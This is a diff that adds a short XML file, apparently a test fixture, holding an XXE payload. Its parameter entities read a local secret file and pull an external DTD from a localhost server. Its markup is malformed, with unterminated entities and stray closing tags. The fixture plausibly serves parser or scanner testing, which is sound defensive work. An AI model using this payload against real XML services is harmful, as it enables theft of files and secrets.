@@ -1,0 +1,2 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % start "<![CDATA["><!ENTITY % goodies SYSTEM "file:///tmp/xjccoy02ka10/secret_txt"><!ENTITY % end "]]><!ENTITY % dtd SYSTEM "http://127.0.0.1:36555/xxe-pe.dtd"><root>&all;</root></!ENTITY></!ENTITY></!ENTITY></!ENTITY>
